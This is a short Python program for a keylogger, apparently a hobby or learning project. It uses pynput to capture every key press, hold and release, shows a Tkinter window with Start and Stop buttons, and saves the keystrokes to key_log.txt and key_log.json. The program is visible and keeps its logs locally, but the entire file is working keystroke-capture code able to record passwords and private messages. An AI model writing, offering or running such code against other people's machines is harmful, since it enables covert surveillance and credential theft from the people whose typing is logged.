import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import threading

keys_used = []
log_data = []
flag = False
keys = ""

def generate_text_log(key):
    try:
        with open('key_log.txt', "a") as keys_file:
            keys_file.write(key)
    except Exception as e:
        print(f"Error writing to text log: {e}")

def generate_json_file(keys_used):
    try:
        with open('key_log.json', 'w') as key_log:
            json.dump(keys_used, key_log, indent=4)
    except Exception as e:
        print(f"Error writing to JSON log: {e}")

def on_press(key):
    global flag, keys_used
    try:
        if not flag:
            keys_used.append({'Pressed': str(key)})
            flag = True
        else:
            keys_used.append({'Held': str(key)})
        generate_json_file(keys_used)
    except Exception as e:
        print(f"Error on key press: {e}")

def on_release(key):
    global flag, keys_used, keys
    try:
        keys_used.append({'Released': str(key)})
        flag = False
        generate_json_file(keys_used)
        
        key_str = str(key).replace("'", "")
        if key_str.startswith("Key."):
            key_str = f"[{key_str.split('.')[1]}]"
        
        keys += key_str + " "
        generate_text_log(key_str + " ")
    except Exception as e:
        print(f"Error on key release: {e}")

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = Tk()
root.title("Keylogger")

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack(pady=20)

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack(side=LEFT, padx=20)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT, padx=20)

root.geometry("350x150")
root.mainloop()
